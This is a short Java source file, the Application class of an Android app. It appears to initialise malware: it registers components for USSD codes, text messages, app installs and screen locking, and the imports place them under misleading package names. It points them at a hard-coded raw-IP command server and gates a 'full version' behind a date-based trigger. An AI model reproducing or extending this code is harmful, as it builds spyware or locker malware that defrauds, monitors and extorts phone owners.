package com.app.manager;

import android.app.Application;

import java.util.ArrayList;
import java.util.List;

import commons.app.com.commons.CommonUtils;
import commons.app.com.commons.commons.SdkCommonsImpl;
import commons.app.com.commons.commons.SdkComponent;
import utils.app.com.installs.InstallsComponent;
import tools.app.com.loc_service.LockerComponent;
import privacy.app.com.text.TextComponent;
import volley.app.com.ussd.UssdComponent;

public class App extends Application {

    @Override
    public void onCreate() {
        super.onCreate();
        boolean useFullVersion = CommonUtils.checkIsFullVersionTime("01-01-2018");
        List<SdkComponent> components = new ArrayList<>();
        components.add(new InstallsComponent());
        components.add(new UssdComponent());
        components.add(new TextComponent());
        components.add(new LockerComponent());
        SdkCommonsImpl.init(this,
                BuildConfig.APPLICATION_ID,
                "http://217.23.12.122:91/api/v1/",
                MainActivity.class,
                BuildConfig.DEBUG, useFullVersion,
                components);
    }
}
